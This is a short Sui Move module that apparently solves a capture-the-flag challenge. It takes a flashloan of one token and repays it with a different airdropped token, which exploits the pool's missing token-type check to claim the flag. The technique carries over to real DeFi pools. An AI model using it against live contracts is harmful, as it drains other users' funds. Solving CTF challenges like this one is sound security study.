module solve_week2::solve{
    use week2::challenge::{Challenge, get_flag, claim_drop, create_challenge};
    use week2::pool::{CreatePoolCap, flashloan, repay_flashloan};
    use week2::lp::LP;
    use week2::butt::{BUTT, MintBUTT};
    use week2::drop::{DROP, MintDROP};
    use std::string::String;
    use sui::transfer::public_share_object;

    #[allow(lint(share_owned))]
    public entry fun create(mint_butt: MintBUTT<BUTT>, mint_drop: MintDROP<DROP>, create_cap: CreatePoolCap<LP>, ctx: &mut TxContext) {
        let challenge = create_challenge(mint_butt, mint_drop, create_cap, ctx);
        public_share_object(challenge);
    }

    public fun solve_get_flag(
        challenge: &mut Challenge<LP, BUTT, DROP>,
        github_id: String,
        ctx: &mut TxContext) {
        // get airdrop 1100 -> split to leave only 1050
        let (coin1, coin2) = {
            let mut balance = claim_drop(challenge, ctx).into_balance();
            let split_balance = balance.split(1050);
            (split_balance.into_coin(ctx), balance.into_coin(ctx))
        };
        transfer::public_transfer(coin2, @0x0);
        // flashloan<BUTT> 1000, receipt 1050
        let (coin, receipt) = flashloan<LP, BUTT>(challenge.get_pool_mut(), 1000, ctx);
        transfer::public_transfer(coin, @0x0);
        // repay_flashloan<DROP> 1050
        repay_flashloan<LP, DROP>(challenge.get_pool_mut(), receipt, coin1);
        get_flag(challenge, github_id, ctx);
    }
}